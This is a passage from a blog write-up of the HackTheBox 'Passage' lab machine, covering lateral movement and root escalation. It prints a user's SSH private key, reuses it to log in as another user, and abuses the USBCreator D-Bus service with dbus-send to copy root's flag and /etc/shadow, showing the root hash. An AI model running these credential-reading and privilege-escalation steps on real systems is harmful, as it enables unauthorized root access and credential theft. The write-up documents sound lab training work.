</span></span></code></pre></td></tr></table></div></div><p>Two users are on the system: paul & nadav, and hopefully we cracked paul&rsquo;s
password so we are able to connect as paul and obtain the first flag.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=err>@</span><span class=n>passage</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span><span class=o>/</span><span class=n>CuteNews</span><span class=o>/</span><span class=n>cdata</span><span class=o>/</span><span class=n>users</span><span class=o>$</span> <span class=n>su</span> <span class=n>paul</span>
</span></span><span class=line><span class=cl><span class=n>su</span> <span class=n>paul</span>
</span></span><span class=line><span class=cl><span class=n>Password</span><span class=p>:</span> <span class=n>atlanta1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>paul</span><span class=err>@</span><span class=n>passage</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span><span class=o>/</span><span class=n>CuteNews</span><span class=o>/</span><span class=n>cdata</span><span class=o>/</span><span class=n>users</span><span class=o>$</span> <span class=n>cd</span>
</span></span><span class=line><span class=cl><span class=n>cd</span>
</span></span><span class=line><span class=cl><span class=n>paul</span><span class=err>@</span><span class=n>passage</span><span class=p>:</span><span class=o>~$</span> <span class=n>cat</span> <span class=n>user</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl><span class=n>cat</span> <span class=n>user</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl><span class=mi>82727</span><span class=n>a23b73c48168c14aba87fc6a769</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=waypoint>Waypoint<a hidden class=anchor aria-hidden=true href=#waypoint>#</a></h2><p>Let&rsquo;s save paul&rsquo;s SSH key as a waypoint because only SSH pubkey method is allowed.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ paul@passage:~$ cat .ssh/id_rsa
</span></span><span class=line><span class=cl>cat .ssh/id_rsa
</span></span><span class=line><span class=cl>-----BEGIN RSA PRIVATE KEY-----
</span></span><span class=line><span class=cl>MIIEpAIBAAKCAQEAs14rHBRld5fU9oL1zpIfcPgaT54Rb+QDj2oAK4M1g5PblKu/
</span></span><span class=line><span class=cl>+L+JLs7KP5QL0CINoGGhB5Q3aanfYAmAO7YO+jeUS266BqgOj6PdUOvT0GnS7M4i
</span></span><span class=line><span class=cl>Z2Lpm4QpYDyxrgY9OmCg5LSN26Px948WE12N5HyFCqN1hZ6FWYk5ryiw5AJTv/kt
</span></span><span class=line><span class=cl>rWEGu8DJXkkdNaT+FRMcT1uMQ32y556fczlFQaXQjB5fJUXYKIDkLhGnUTUcAnSJ
</span></span><span class=line><span class=cl>JjBGOXn1d2LGHMAcHOof2QeLvMT8h98hZQTUeyQA5J+2RZ63b04dzmPpCxK+hbok
</span></span><span class=line><span class=cl>sjhFoXD8m5DOYcXS/YHvW1q3knzQtddtqquPXQIDAQABAoIBAGwqMHMJdbrt67YQ
</span></span><span class=line><span class=cl>eWztv1ofs7YpizhfVypH8PxMbpv/MR5xiB3YW0DH4Tz/6TPFJVR/K11nqxbkItlG
</span></span><span class=line><span class=cl>QXdArb2EgMAQcMwM0mManR7sZ9o5xsGY+TRBeMCYrV7kmv1ns8qddMkWfKlkL0lr
</span></span><span class=line><span class=cl>lxNsimGsGYq10ewXETFSSF/xeOK15hp5rzwZwrmI9No4FFrX6P0r7rdOaxswSFAh
</span></span><span class=line><span class=cl>zWd1GhYk+Z3qYUhCE0AxHxpM0DlNVFrIwc0DnM5jogO6JDxHkzXaDUj/A0jnjMMz
</span></span><span class=line><span class=cl>R0AyP/AEw7HmvcrSoFRx6k/NtzaePzIa2CuGDkz/G6OEhNVd2S8/enlxf51MIO/k
</span></span><span class=line><span class=cl>7u1gB70CgYEA1zLGA35J1HW7IcgOK7m2HGMdueM4BX8z8GrPIk6MLZ6w9X6yoBio
</span></span><span class=line><span class=cl>GS3B3ngOKyHVGFeQrpwT1a/cxdEi8yetXj9FJd7yg2kIeuDPp+gmHZhVHGcwE6C4
</span></span><span class=line><span class=cl>IuVrqUgz4FzyH1ZFg37embvutkIBv3FVyF7RRqFX/6y6X1Vbtk7kXsMCgYEA1WBE
</span></span><span class=line><span class=cl>LuhRFMDaEIdfA16CotRuwwpQS/WeZ8Q5loOj9+hm7wYCtGpbdS9urDHaMZUHysSR
</span></span><span class=line><span class=cl>AHRFxITr4Sbi51BHUsnwHzJZ0o6tRFMXacN93g3Y2bT9yZ2zj9kwGM25ySizEWH0
</span></span><span class=line><span class=cl>VvPKeRYMlGnXqBvJoRE43wdQaPGYgW2bj6Ylt18CgYBRzSsYCNlnuZj4rmM0m9Nt
</span></span><span class=line><span class=cl>1v9lucmBzWig6vjxwYnnjXsW1qJv2O+NIqefOWOpYaLvLdoBhbLEd6UkTOtMIrj0
</span></span><span class=line><span class=cl>KnjOfIETEsn2a56D5OsYNN+lfFP6Ig3ctfjG0Htnve0LnG+wHHnhVl7XSSAA9cP1
</span></span><span class=line><span class=cl>9pT2lD4vIil2M6w5EKQeoQKBgQCMMs16GLE1tqVRWPEH8LBbNsN0KbGqxz8GpTrF
</span></span><span class=line><span class=cl>d8dj23LOuJ9MVdmz/K92OudHzsko5ND1gHBa+I9YB8ns/KVwczjv9pBoNdEI5KOs
</span></span><span class=line><span class=cl>nYN1RJnoKfDa6WCTMrxUf9ADqVdHI5p9C4BM4Tzwwz6suV1ZFEzO1ipyWdO/rvoY
</span></span><span class=line><span class=cl>f62mdwKBgQCCvj96lWy41Uofc8y65CJi126M+9OElbhskRiWlB3OIDb51mbSYgyM
</span></span><span class=line><span class=cl>Uxu7T8HY2CcWiKGe+TEX6mw9VFxaOyiBm8ReSC7Sk21GASy8KgqtfZy7pZGvazDs
</span></span><span class=line><span class=cl>OR3ygpKs09yu7svQi8j2qwc7FL6DER74yws+f538hI7SHBv9fYPVyw==
</span></span><span class=line><span class=cl>-----END RSA PRIVATE KEY-----
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ chmod 600 paul_rsa.key
</span></span><span class=line><span class=cl>$ ssh paul@passage.htb -i paul_rsa.key
</span></span></code></pre></td></tr></table></div></div><h2 id=privilege-escalation-of-machine--paul-to-nadav>Privilege Escalation of Machine : paul to nadav<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--paul-to-nadav>#</a></h2><p>I ran linpeas but that was useless, you had to guess the key was re-used
by nadav as well, which is not very realistic.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ssh nadav@passage.htb -i paul_rsa.key
</span></span></code></pre></td></tr></table></div></div><h2 id=privilege-escalation-of-machine--nadav-to-root>Privilege Escalation of Machine : nadav to root<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--nadav-to-root>#</a></h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ paul@passage:~$ groups nadav
</span></span><span class=line><span class=cl>nadav : nadav adm cdrom sudo dip plugdev lpadmin sambashare
</span></span></code></pre></td></tr></table></div></div><p>It seems we will hack printers.</p><p>The first clue is that port 631 (Internet Printing Protocol(IPP)) is open on localhost.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ss -nlpt
</span></span><span class=line><span class=cl>State      Recv-Q Send-Q                                                                         Local Address:Port                                                                                        Peer Address:Port
</span></span><span class=line><span class=cl>LISTEN     0      128                                                                                        *:22                                                                                                     *:*
</span></span><span class=line><span class=cl>LISTEN     0      5                                                                                  127.0.0.1:631                                                                                                    *:*
</span></span><span class=line><span class=cl>LISTEN     0      128                                                                                       :::80                                                                                                    :::*
</span></span><span class=line><span class=cl>LISTEN     0      128                                                                                       :::22                                                                                                    :::*
</span></span><span class=line><span class=cl>LISTEN     0      5                                                                                        ::1:631                                                                                                   :::*
</span></span></code></pre></td></tr></table></div></div><p>A second clue is that nadav is in <code>lpadmin</code> group.</p><p>A third clue if you list process:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ps -ef f
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>root       9774      1  0 07:35 ?        Ss     0:00 /usr/sbin/cupsd -l
</span></span><span class=line><span class=cl>lp         9779   9774  0 07:35 ?        S      0:00  \_ /usr/lib/cups/notifier/dbus dbus://
</span></span><span class=line><span class=cl>root       9775      1  0 07:35 ?        Ssl    0:00 /usr/sbin/cups-browsed
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s find CUPS version:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>apt</span> <span class=n>policy</span> <span class=n>cups</span>
</span></span><span class=line><span class=cl><span class=n>cups</span><span class=p>:</span>
</span></span><span class=line><span class=cl>  <span class=n>Installed</span><span class=p>:</span> <span class=mf>2.1</span><span class=o>.</span><span class=mi>3</span><span class=o>-</span><span class=mi>4</span><span class=n>ubuntu0</span><span class=o>.</span><span class=mi>7</span>
</span></span><span class=line><span class=cl>  <span class=n>Candidate</span><span class=p>:</span> <span class=mf>2.1</span><span class=o>.</span><span class=mi>3</span><span class=o>-</span><span class=mi>4</span><span class=n>ubuntu0</span><span class=o>.</span><span class=mi>7</span>
</span></span><span class=line><span class=cl>  <span class=n>Version</span> <span class=n>table</span><span class=p>:</span>
</span></span><span class=line><span class=cl> <span class=o>***</span> <span class=mf>2.1</span><span class=o>.</span><span class=mi>3</span><span class=o>-</span><span class=mi>4</span><span class=n>ubuntu0</span><span class=o>.</span><span class=mi>7</span> <span class=mi>100</span>
</span></span><span class=line><span class=cl>        <span class=mi>100</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>dpkg</span><span class=o>/</span><span class=n>status</span>
</span></span><span class=line><span class=cl>     <span class=mf>2.1</span><span class=o>.</span><span class=mi>3</span><span class=o>-</span><span class=mi>4</span> <span class=mi>500</span>
</span></span><span class=line><span class=cl>        <span class=mi>500</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>us</span><span class=o>.</span><span class=n>archive</span><span class=o>.</span><span class=n>ubuntu</span><span class=o>.</span><span class=n>com</span><span class=o>/</span><span class=n>ubuntu</span> <span class=n>xenial</span><span class=o>/</span><span class=n>main</span> <span class=n>amd64</span> <span class=n>Packages</span>
</span></span></code></pre></td></tr></table></div></div><p>But it seems it&rsquo;s pretty much recent and patched. In fact CUPS was only
a sneaky rabbit hole.</p><p>We can find some info about some files edited with vim in <code>.viminfo</code>.</p><p><code>/etc/dbus-1/system.d/com.ubuntu.USBCreator.conf</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE busconfig PUBLIC
</span></span></span><span class=line><span class=cl><span class=cp> &#34;-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN&#34;
</span></span></span><span class=line><span class=cl><span class=cp> &#34;http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;busconfig&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c>&lt;!-- Only root can own the service --&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;policy</span> <span class=na>user=</span><span class=s>&#34;root&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;allow</span> <span class=na>own=</span><span class=s>&#34;com.ubuntu.USBCreator&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;/policy&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c>&lt;!-- Allow anyone to invoke methods (further constrained by
</span></span></span><span class=line><span class=cl><span class=c>       PolicyKit privileges --&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;policy</span> <span class=na>context=</span><span class=s>&#34;default&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;allow</span> <span class=na>send_destination=</span><span class=s>&#34;com.ubuntu.USBCreator&#34;</span>
</span></span><span class=line><span class=cl>           <span class=na>send_interface=</span><span class=s>&#34;com.ubuntu.USBCreator&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;allow</span> <span class=na>send_destination=</span><span class=s>&#34;com.ubuntu.USBCreator&#34;</span>
</span></span><span class=line><span class=cl>           <span class=na>send_interface=</span><span class=s>&#34;org.freedesktop.DBus.Introspectable&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;allow</span> <span class=na>send_destination=</span><span class=s>&#34;com.ubuntu.USBCreator&#34;</span>
</span></span><span class=line><span class=cl>           <span class=na>send_interface=</span><span class=s>&#34;org.freedesktop.DBus.Properties&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;/policy&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nt>&lt;/busconfig&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p><code>/etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-ini data-lang=ini><span class=line><span class=cl><span class=k>[Configuration]</span>
</span></span><span class=line><span class=cl><span class=na>AdminIdentities</span><span class=o>=</span><span class=s>unix-group:sudo;unix-group:admin</span>
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s find information on the D-BUS service object:
See <a href=https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation>HackTricks - D-Bus Enumeration & Command Injection Privilege Escalation</a>,
(it&rsquo;s based on <a href=https://blog.raw.pm/en/HackTheBox-Oouch-write-up/>Oouch </a>).</p><p>List interfaces of the service object.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ nadav@passage:~$ busctl tree com.ubuntu.USBCreator
</span></span><span class=line><span class=cl>ΓööΓöÇ/com
</span></span><span class=line><span class=cl>  ΓööΓöÇ/com/ubuntu
</span></span><span class=line><span class=cl>    ΓööΓöÇ/com/ubuntu/USBCreator
</span></span></code></pre></td></tr></table></div></div><p>Introspect an interface of the service object.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>nadav</span><span class=err>@</span><span class=n>passage</span><span class=p>:</span><span class=o>~$</span> <span class=n>busctl</span> <span class=n>introspect</span> <span class=n>com</span><span class=o>.</span><span class=n>ubuntu</span><span class=o>.</span><span class=n>USBCreator</span> <span class=o>/</span><span class=n>com</span><span class=o>/</span><span class=n>ubuntu</span><span class=o>/</span><span class=n>USBCreator</span>
</span></span><span class=line><span class=cl><span class=n>NAME</span>                                <span class=n>TYPE</span>      <span class=n>SIGNATURE</span> <span class=n>RESULT</span><span class=o>/</span><span class=n>VALUE</span> <span class=n>FLAGS</span>
</span></span><span class=line><span class=cl><span class=n>com</span><span class=o>.</span><span class=n>ubuntu</span><span class=o>.</span><span class=n>USBCreator</span>               <span class=n>interface</span> <span class=o>-</span>         <span class=o>-</span>            <span class=o>-</span>
</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>Image</span>                              <span class=n>method</span>    <span class=n>ssb</span>       <span class=o>-</span>            <span class=o>-</span>
</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>KVMOk</span>                              <span class=n>method</span>    <span class=o>-</span>         <span class=n>b</span>            <span class=o>-</span>
</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>KVMTest</span>                            <span class=n>method</span>    <span class=n>sa</span><span class=p>{</span><span class=n>ss</span><span class=p>}</span>    <span class=o>-</span>            <span class=o>-</span>
</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>Shutdown</span>                           <span class=n>method</span>    <span class=o>-</span>         <span class=o>-</span>            <span class=o>-</span>
</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>Unmount</span>                            <span class=n>method</span>    <span class=n>s</span>         <span class=o>-</span>            <span class=o>-</span>
</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>Progress</span>                           <span class=k>signal</span>    <span class=n>u</span>         <span class=o>-</span>            <span class=o>-</span>
</span></span><span class=line><span class=cl><span class=n>org</span><span class=o>.</span><span class=n>freedesktop</span><span class=o>.</span><span class=n>DBus</span><span class=o>.</span><span class=n>Introspectable</span> <span class=n>interface</span> <span class=o>-</span>         <span class=o>-</span>            <span class=o>-</span>
</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>Introspect</span>                         <span class=n>method</span>    <span class=o>-</span>         <span class=n>s</span>            <span class=o>-</span>
</span></span></code></pre></td></tr></table></div></div><p>See <a href=https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/>USBCreator D-Bus Privilege Escalation in Ubuntu Desktop</a>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ dbus-send --system --print-reply --dest=com.ubuntu.USBCreator /com/ubuntu/USBCreator com.ubuntu.USBCreator.Image string:/root/root.txt string:/tmp/flag boolean:true
</span></span><span class=line><span class=cl>method return time=1599506246.809850 sender=:1.330 -&gt; destination=:1.349 serial=25 reply_serial=2
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>nadav@passage:/tmp$ cat flag
</span></span><span class=line><span class=cl>47a715c664ab8efbf982251c79968757
</span></span></code></pre></td></tr></table></div></div><h2 id=bonus>Bonus<a hidden class=anchor aria-hidden=true href=#bonus>#</a></h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ dbus-send --system --print-reply --dest=com.ubuntu.USBCreator /com/ubuntu/USBCreator com.ubuntu.USBCreator.Image string:/etc/shadow string:/tmp/shadow boolean:true
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ cat /tmp/shadow | grep root
</span></span><span class=line><span class=cl>root:$6$mjc8Tvgr$L56bn5KQDtOyKRdXBTL4xcmT7FVWJbds.Fo0FVc11PWliaNu5ASAxKzaEddyaYGMxGQPUNo5UpxT/nawzS8TW0:18464:0:99999:7:::
</span></span></code></pre></td></tr></table></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li><li><a href=https://s4ch.github.io/tags/medium/>Medium</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>